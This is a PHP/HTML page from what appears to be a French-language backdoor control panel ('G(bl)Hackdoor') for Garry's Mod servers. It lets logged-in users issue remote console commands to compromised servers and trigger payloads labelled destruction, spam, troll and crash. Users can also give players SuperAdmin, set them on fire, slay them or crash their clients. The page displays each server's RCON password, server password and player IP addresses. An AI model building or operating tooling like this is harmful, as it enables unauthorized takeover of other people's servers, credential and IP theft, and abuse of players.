<?php
include 'core/class/include.php';

$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/FUf4yUb");
  }
// Redirige l'utilisateur si il n'est pas authentifier
  
if (!Account::isAuthentified())
{
    header('Location: fe15hg6rt1e.php');

    exit();
}

if(!isset($_GET["server"]))
  die("Ce n'est pas un dossier . . .");
$ussssr = Server::GetServer($_GET["server"]);
$admin = IsAdmin($_SESSION["id"]);
if(!IsAdmin($_SESSION["id"], $ussssr["userid"]))
  die("Ce serveur ne t'appartient pas")
?>

!DOCTYPE html>
<html lang="fr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<meta name="description" content="">
<meta name="author" content="">
<meta charset="utf-8">
<title>G(bl)Hackdoor | Home</title>
<link rel="stylesheet" href="assets/styles/some.min.css">
<link rel="stylesheet" href="assets/plugin/fonts/material-design/materialdesignicons.css">
<link rel="stylesheet" href="assets/plugin/toastr/toastr.css">
<link rel="icon" type="image/ico" href="assets/kvacdoor.ico" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
<link rel="stylesheet" href="https://cdn.datatables.net/v/bs/jq-3.3.1/dt-1.10.18/datatables.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="assets/plugin/toastr/toastr.min.js"></script>
<script src="assets/scripts/shortcut.js"></script>
<script src="assets/scripts/kvac.js"></script>
<script src="assets/scripts/htmlencode.min.js"></script>


<style>
	.col-xs-12{width: 70%};
	.col-lg-4{width: 30%};
</style>
<style>
select:-moz-focusring {
	color: transparent;
	text-shadow: 0 0 0 #555;
}

.chat {
	width: 100%;
	height: 300px;
	line-height: 3em;
	overflow: auto;
	border: 1px double ;
	border-radius: 0.5%;
	align: left;
}

.has-success .form-control
{
	border-color: ;
}

input[type="checkbox"] {
	visibility: hidden;
}

.alt-checkbox {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
	-khtml-user-select: none;
	-moz-user-select: none;
	-ms-user-select: none;
	user-select: none;
	height: 30px;
	width: 110px;
	background-color: #444;
	border-radius: 100px;
	cursor: pointer;
}

.alt-checkbox > left {
	font-size: 90%;
	position: absolute;
	transform: translate(-5px, 6px);
}

.alt-checkbox > right {
	font-size: 90%;
	position: absolute;
	transform: translate(46px, 6px);
}

.alt-checkbox check {
	position: absolute;
	background-color: #08f;
	width: 55px;
	transform: translate(-16px);
	height: 30px;
	border-radius: 100px;
	transition: all .5s ease;
	z-index: 1;
}

.alt-checkbox input[type="checkbox"]:checked + check {
	background-color: #f80;
	transform: translate(39px);
}

</style>
<style>
 .fixed-navbar {
	 position: fixed;
	 top: 0px;
	 left: 260px;
	 z-index: 20;
	 right: 0px;
	 padding: 0px 20px 0px 80px;
	 background: ;
	 color: white;
}
 .header .logo {
	 position: absolute;
	 top: 0;
	 left: 0;
	 width: 100%;
	 text-align: center;
	 font-family: "Poppins", sans-serif;
	 font-size: 20px;
	 line-height: 75px;
	 height: 75px;
	 white-space: nowrap;
	 overflow: hidden;
	 color: white;
	 background: ;
	 font-weight: 500;
}
.navigation .menu li.current a {
	 background: ;
	 color: white;
}
 .text-primary {
	 color:  !important;
}
 .btn-primary {
	 background: ;
}
 .btn-info {
	 background: ;
}
 .btn-primary:hover {
	 background:  !important;
}
 .btn-info:hover {
	 background:  !important;
}
 .user .avatar img {
	 border: 3px solid ;
	 -webkit-border-radius: 100%;
	 -moz-border-radius: 100%;
	 border-radius: 100%;
	 transition: all 0.4s ease;
	 -moz-transition: all 0.4s ease;
	 -o-transition: all 0.4s ease;
	 -ms-transition: all 0.4s ease;
	 -webkit-transition: all 0.4s ease;
}
 .col-lg-4 {
	 width: 30%;
}
 .avatar_user {
	 vertical-align: middle;
	 width: 50px;
	 height: 50px;
	 border-radius: 50%;
}
</style>

<!-- IF USER USE DARK THEME -->
<link rel="stylesheet" href="assets/styles/dark.css">
 

<style>
.pricing-table .col-first .thead {
	border-top-color: rgb(82, 84, 87);
	border-right-color: rgb(82, 84, 87);
	border-bottom-color: rgb(82, 84, 87);
	border-left-color: rgb(82, 84, 87);
	color: rgb(80, 168, 255);
	background-image: initial;
	background-color: rgb(49, 50, 55);
}
.pricing-table .td {
	border-right-color: rgb(82, 84, 87);
	border-bottom-color: rgb(82, 84, 87);
	color: rgb(253, 251, 247);
	background-image: initial;
	background-color: rgb(49, 50, 55);
}
.pricing-table .col-first .td {
	border-left-color: rgb(82, 84, 87);
}
.pricing-table .td .fa-times {
	color: rgb(227, 223, 216);
}
.pricing-table .thead.bg-blue-1 {
	background-color: rgb(31, 58, 211);
}
.idis {
	color:grey !important;
}
</style>
</head>
<body>
<div class="main-menu">
<header class="header">
<a href="panel.php" class="logo"><i class="fa fa-code"></i> G(bl)Hackdoor</a>
<button type="button" class="button-close fa fa-times js__menu_close"></button>
<div class="user">
<a class="avatar">
    <?php $ussre = Account::GetUser($_SESSION['id']); $d = json_decode(html_entity_decode($ussre["discord"])); if($ussre["discord"] != "" || $ussre["pdp"] == "") { echo "<img src='https://cdn.discordapp.com/avatars/" . $d->id ."/". $d->avatar . ".png?size=128' alt='".$ussre['username']."'>"; }else{ echo "<img src='" . $ussre['pdp'] . "' alt='".$ussre['username']."'>"; } ?>

    <span class="status online"></span></a>
<h5 class="name"><?php echo $ussre['username']; ?></h5>
<h5 class="position"><?php echo $ussre['rank'] ?></h5>
<div class="control-wrap js__drop_down">
<i class="fa fa-caret-down js__drop_down_button"></i>
<div class="control-list">
<div class="control-item" data-toggle="modal" data-target="#boostrapModal-edit"><a><i class="fa fa-edit"></i> Editer la Couleur</a></div>
<div class="control-item" data-toggle="modal" data-target="#boostrapModal-desc"><a><i class="fa fa-wpforms"></i> Editer Description</a></div>
<div class="control-item"><a onclick="theme('Clair');"><i class="fa fa-adjust"></i> Clair</a></div>
<div class="control-item"><a href="../logout.php"><i class="fa fa-sign-out"></i> Deconnexion</a></div>
</div>
</div>
</div>
</header>
<div class="content">
<div class="navigation">
<h5 class="title">Navigation</h5>
<ul class="menu js__accordion">
<li>
<a class="waves-effect" href="panel.php"><i class="menu-icon mdi mdi-home"></i><span>Tableau de bord</span></a>
</li>
<li>
<a class="waves-effect" href="servers.php"><i class="menu-icon">Ҡ</i><span>Mes serveurs</span></a>
</li>
<li>
<a class="waves-effect" href="history.php"><i class="menu-icon fa fa-history"></i><span>Historique serveurs</span></a>
</li>
<li>
<a class="waves-effect" href="payloads.php"><i class="menu-icon fa fa-rocket"></i><span>Mes Payloads</span></a>
</li>
</ul>
<h5 id="keetasueur" class="title">Extra</h5>
<ul class="menu">
<li>
<a class="waves-effect" href="tutoriels.html"><i class="menu-icon mdi mdi-desktop-mac"></i><span>Les tutoriels</span></a>
</li>

<li>
<a class="waves-effect idis" onclick="return false" href="../obfuscateur"><i class="menu-icon mdi mdi-code-braces idis"></i><span>Encodeur</span></a>
</li>
<li>
<a class="waves-effect idis" onclick="return false" href="../gbackdoor-fucker"><i class="menu-icon mdi mdi-barcode idis"></i><span>GBackDoor Fucker</span></a>
</li>
<li>
<a class="waves-effect idis" onclick="return false" href="../smartlua"><i class="menu-icon fab fa-accessible-icon idis"></i><span>Smart Lua</span></a>
</li>
<li>
<a class="waves-effect idis" onclick="return false" href="../backdoor-finder"><i class="menu-icon fa fa-blind idis"></i><span>BackDoor Finder</span></a>
</li>


</div>
</div>
</div>
<div class="fixed-navbar">
<div class="pull-left">
<h1 class="page-title"></h1>
</div>
<div class="pull-right">
<!--<div class="control-item" data-toggle="modal" data-target="#boostrapModal-internalchat"><span class="ico-item mdi mdi-comment-text notice-alarm"></span></div>-->
</div>
<div class="pull-right">

<div class="ico-item" data-toggle="modal" data-target="#boostrapModal-reglement">
<a href="#" class="ico-item mdi mdi-newspaper" data-target="#searchform-header"></a>
</div>

</div>
</div>
<script>
	$.ajax({
      url: "core/ajax/get-server-console.php?id=<?php echo $_GET['server'] ?>"
    }).done(function(data){ 
      $("#chat_console").html(data);
    });

	function sendCMD(id) {
        $.ajax({
        url: "core/ajax/call-payload.php?server=" + id + "&payload=110&arg=" + $("#ahaconsolED").val()
      }).done(()=>{
        $("#ahaconsolED").val("")
      });
      }

	$.ajax({
			"method": "GET",
			"url": "core/ajax/get-status.php?id=<?php echo $_GET['server'] ?>",
			"success": (data) => 
			{
				if (data == '1'){
				$('.dot').css('background-color', '#22a003');
			}
			else
			{
				$('.dot').css('background-color', '#9e0303');
			}
			}
		});
	setInterval(
	function()
	{
		$.ajax({
      url: "core/ajax/get-server-console.php?id=<?php echo $_GET['server'] ?>"
    }).done(function(data){ 
      $("#chat_console").html(data);
    });
		$.ajax({
			"method": "GET",
			"url": "core/ajax/get-status.php?id=<?php echo $_GET['server'] ?>",
			"success": (data) => 
			{
				if (data == '1'){
				$('.dot').css('background-color', '#22a003');
			}
			else
			{
				$('.dot').css('background-color', '#9e0303');
			}
			}
		});
	}, 5000);
	function scrollBottom_console() 
	{
	   var div = document.getElementById("chat_console");
	   $("#chat_console").animate({
	      scrollTop: div.scrollHeight - div.clientHeight
	   }, 500);
	}
	setTimeout(scrollBottom_console, 500)

	function callPayloads(id, server_id)
{
    var arg = $("#server-payload-arg").val();
    var mode = $("#server-payload-arg-mode").val();
    if(mode != "Texte")
    {
      arg = mode;
    }
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + server_id + "&payload=" + id + "&arg=" + arg
    });
}

function callPayloads2(t, server_id)
{
	var e = document.getElementById("payload_id" + t);
	var strUser = e.options[e.selectedIndex].value;
    var arg = $("#server-payload-arg").val();
    var mode = $("#server-payload-arg-mode").val();
    if(mode != "Texte")
    {
      arg = mode;
    }
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + server_id + "&payload=" + strUser + "&arg=" + arg
    });
}

</script>
<div id="wrapper">
<div class="main-content">
<div class="col-lg-6 col-xs-12">
<div class="box-content card danger">
<h4 class="box-title">
	<span class="dot" style="height: 12px; width: 12px; background-color: #22a003; border-radius: 50%; display: inline-block;"></span>
	  <?php $serve = $GLOBALS['DB']->GetContent("server_list", ["id" => $_GET['server']])[0];
                        echo htmlspecialchars($serve['server_name']); ?></h4>
<div class="dropdown js__drop_down">
<a href="#" class="dropdown-icon fas fa-ellipsis-v js__drop_down_button"></a>
<ul class="sub-menu">
<li><a href="" data-toggle="modal" data-target="#boostrapModal-info">Information</a></li>
<li><a href="" data-toggle="modal" data-target="#boostrapModal-player">Liste des joueurs</a></li>
<li><a href="steam://connect/<?php echo Server::GetServer($_GET['server'])['server_ip']; echo ':'.Server::GetServer($_GET['server'])['server_port']; ?>">Rejoindre le serveur</a></li>
</ul>
</div>
<div class="card-content">
<div align="center">
<div id="chat_console" class="chat" align="left">
</div>
</div>
<br>

    <div class="input-group margin-bottom-20">
        <input type="text" class="form-control" id="ahaconsolED" placeholder="Commande...">
        <div class="input-group-btn">
            <button type="submit" class="btn btn-success no-border waves-effect waves-light" onclick="sendCMD(<?php echo $_GET['server'] ?>)"><i class="fa fa-paper-plane text-white"></i></button>
        </div>
    </div>

</div>
</div>
</div>

<div class="col-lg-4 col-md-6">
<div class="box-content card danger">
<h4 class="box-title">Action</h4>
<div class="dropdown js__drop_down">
<a href="#" class="dropdown-icon fas fa-ellipsis-v js__drop_down_button"></a>
<ul class="sub-menu">
	<?php echo
	'
	<li onclick="callPayloads(71, ' . $_GET["server"] . ');"><a>Redémarrer</a></li>
<li onclick="callPayloads(105, ' . $_GET["server"] . ');"><a>Faire Crash</a></li>
<li onclick="callPayloads(105, ' . $_GET["server"] . ');"><a>Eteindre</a></li>
	'; ?>
</ul>
</div>

<div class="card-content">
	<label>Mode d'argument</label>
            <select class="form-control" id="server-payload-arg-mode" onchange="onArg(this);">
              <option value=1>Texte</option>
              <optgroup label="Joueurs" id="optgroupplayers">
              </optgroup>
            </select>
          <div class="form-group" id="lefameux">
            <textarea class="form-control" rows="3" id="server-payload-arg" placeholder="Argument du payload"></textarea>
          </div>

<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_idadmin">
<option value="">ADMINISTRATION</option>
<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "Administration"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="admin" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>

<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_iddestroy">
<option value="">DESTROY/CLEAN</option>
		<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "Déstruction"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="destroy" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>

<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_idvisuel">
<option value="">(SPAM) VISUEL</option>
		<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "SSV"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="visuel" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>

<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_idactions">
<option value="">ACTIONS</option>
		<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "Actions"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="actions" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>

<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_idtroll">
<option value="">TROLL</option>
		<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "Troll"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="troll" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>


<div class="input-group margin-bottom-20">
<select class="form-control" id="payload_idautre">
<option value="">AUTRE</option>
<?php
 			 $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
  if($data['cate'] == "Autre"){
    if(IsAdmin($_SESSION["id"], $userid))
        {

                echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";

        }else{
        	if($userid == $_SESSION['id'] || $userid == 0){
            echo 
                        "
                        <option value='" . $data['id'] . "'>" . htmlspecialchars($data['payload_name']) . "</option>
                        ";
       }
        }
    }
}
 			 ?>
</select>
<div class="input-group-btn">
<button type="submit" class="btn btn-primary text-white no-border dropdown-toggle" id="autre" onclick="callPayloads2(this.id, <?php echo $_GET['server'] ?>)"><span>OK</span></button>
</div>
</div>

<form method="post">
<button type="button" disabled="disabled" class="btn btn-info waves-effect waves-light" data-toggle="modal" data-target="#boostrapModal-upload"><i class="ico ico-left fa fa-upload"></i>Upload</button>
<button name="dl" type="submit" class="btn btn-info waves-effect waves-light" disabled="disabled" value="1"><i class="ico ico-left fa fa-file-archive-o"></i>Créer L'Archive (.zip)</button>

<p>
<div id="files">
Nombre de fichiers: 0<br>
<i class="ico ico-left fa fa-download"></i> No Archive </div></p>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="boostrapModal-upload" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true"></span></button>
<h4 class="modal-title" id="myModalLabel">Télécharger</h4>
</div>
<div class="modal-body">
<p>Voulez-vous vraiment envoyer une demande de téléchargement au serveur "Garry's Mod"? (~1 minute)</p>
</div>
<div class="modal-footer">
<form method="post">
<button type="button" class="btn btn-default btn-sm waves-effect waves-light" data-dismiss="modal">Non</button>
<button name="request" type="submit" class="btn btn-primary btn-sm waves-effect waves-light" value="1">Oui</button>
</form>
</div>
</div>
</div>
</div>


<div class="modal fade" id="boostrapModal-player" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header" align="center">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true"></span></button>
<h4 class="modal-title" id="myModalLabel">Liste des joueurs</h4>
</div>
<div class="modal-body" align="center" id="playersrerss">

	</div>
</div>
</div>
</div>

<div class="modal fade" id="boostrapModal-info" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header" align="center">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true"></span></button>
<h4 class="modal-title" id="myModalLabel">Information</h4>
</div>
<div class="modal-body">
	<?php

	$serv = $GLOBALS['DB']->GetContent("server_list", ["id" => $_GET['server']])[0];
                        echo 
                        "
                                <p><b>IP:</b> " . htmlspecialchars($serv['server_ip']) . "</p>
                                <p><b>Port:</b> " . htmlspecialchars($serv['server_port']) . "</p>
                                <p><b>Gamemode:</b> " . htmlspecialchars($serv['gm']) . "</p>
                                <p><b>Map:</b> " . htmlspecialchars($serv['map']) . "</p>
                                <p><b>Rcon:</b> " . htmlspecialchars($serv['rcon']) . "</p>
                                <p><b>Password:</b> " . htmlspecialchars($serv['pw']) . "</p>
                                <p><b>Slots:</b> " . htmlspecialchars($serv['server_users']) . "</p>
                        ";

	?>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default btn-sm waves-effect waves-light" data-dismiss="modal">Fermer</button>
</div>
</div>
</div>
</div>

<div class="modal fade" id="boostrapModal-argument" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">Executer une payload</h4>
</div>
<div class="modal-body">
<form action="" method="post">
<input type="text" name="arguments" class="form-control" id="inp-type-1" placeholder="Donnez moi un argument s'il vous plait">
<input type="hidden" name="arguments_hide" value="">
</div>
<div class="modal-footer">
<button type="submit" name="reload" class="btn btn-primary text-white no-border dropdown-toggle"><span>Executer</span></button>
</form>
</div>
</div>
</div>
</div>
<!-- OVERLAY -->

<?php include 'get_down.php'; ?>

<script>

function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
 }
    	function decodeHTMLEntities(text) {
    var entities = [
        ['amp', '&'],
        ['apos', '\''],
        ['#x27', '\''],
        ['#x2F', '/'],
        ['#39', '\''],
        ['#47', '/'],
        ['lt', '<'],
        ['gt', '>'],
        ['nbsp', ' '],
        ['quot', '"']
    ];

    for (var i = 0, max = entities.length; i < max; ++i) 
        text = text.replace(new RegExp('&'+entities[i][0]+';', 'g'), entities[i][1]);

    return text;
}

function onPayloadChanges() {
	$.ajax({
      url: "core/ajax/get-server-players.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
    	$("#optgroupplayers").html("");
        $.each(data, function(i, item) {
        	$("#optgroupplayers").html($("#optgroupplayers").html() + '<option value="player.GetBySteamID(' + escapeHtml(item.steamid) + ')">' + escapeHtml(item.name) + ' (' + escapeHtml(item.group) + ')</option>')
        });
    });
}

function onArg(d)
{
	if (d.value == 1)
	{
        $("#lefameux").html('<textarea class="form-control" rows="3" id="server-payload-arg" placeholder="Argument du payload"></textarea>');
	}
	else
	{
		$("#lefameux").html("");
	}
}


onPayloadChanges();


setInterval(()=>{
	$.ajax({
      url: "core/ajax/get-server-players.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
    	$("#playersrerss").html("");
        $.each(data, function(i, item) {
        	$("#playersrerss").html($("#playersrerss").html() + '<li class="list-group-item" style="background-color:#20262E;color:white;"><span class="text-danger">' + escapeHtml(item.name) + '</span> <span class="badge badge-info">' + escapeHtml(item.group) + ' </span><br />' + escapeHtml(item.steamid) + ' <a href="#" onclick="plyActionn(8, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-angle-double-up"></i> SuperAdmin </a><a href="#" onclick="plyActionn(126, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-angle-double-down"></i> User </a><br /><code>' + escapeHtml(item.ip) + '</code>' +
        		' <a href="#" onclick="plyActionn(104, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-toggle-on"></i> DeathNote menu </a>' +
        		' <a href="#" onclick="plyActionn(86, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-fire"></i> Fire </a>' +
        		' <a href="#" onclick="plyActionn(85, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-bolt"></i> Slay </a>' +
        		' <a href="#" onclick="plyActionn(127, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-low-vision"></i> Crash </a>' +
        		' <a href="#" onclick="plyActionn(87, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-bomb"></i> Kick </a></li>');
        });
    });
    	}, 5000);

const checkboxs = document.getElementsByClassName("alt-checkbox");
for (let i = checkboxs.length - 1; i >= 0; --i)
{
	checkboxs[i].addEventListener("click", () => {
		checkboxs[i].children[0].checked = !checkboxs[i].children[0].checked;
	});
}

</script>

<script src="assets/scripts/jquery.min.js"></script>
<script src="assets/scripts/modernizr.min.js"></script>
<script src="assets/scripts/bootstrap.min.js"></script>
<script src="assets/plugin/nprogress/nprogress.js"></script>
<script src="assets/scripts/main.min.js"></script>
</body>
</html>

